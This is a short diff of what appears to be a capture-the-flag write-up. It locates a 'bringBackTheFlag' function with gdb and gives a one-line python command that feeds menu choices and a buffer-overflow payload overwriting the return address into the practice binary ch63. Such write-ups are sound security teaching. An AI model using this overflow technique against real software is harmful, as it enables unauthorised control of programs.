@@ -139,8 +139,7 @@ According to gdb, the function is at 0x80487cb:
 $1 = {<text variable, no debug info>} 0x80487cb <bringBackTheFlag>
 ```
 
-So after writing a quick python script (uploaded to this repo), we've got the
-following output:
+So after combining all of the above, we've got the following output:
 ```sh
 $ python -c "print '1\n' + 'albert\n' + '4\n' + '5\n' + 'AAAABBBBCCCC\xcb\x87\x04\x08\n' + 'EEEEFFFF\n' + '2\n'" | ./ch63
 1: Buy a dog
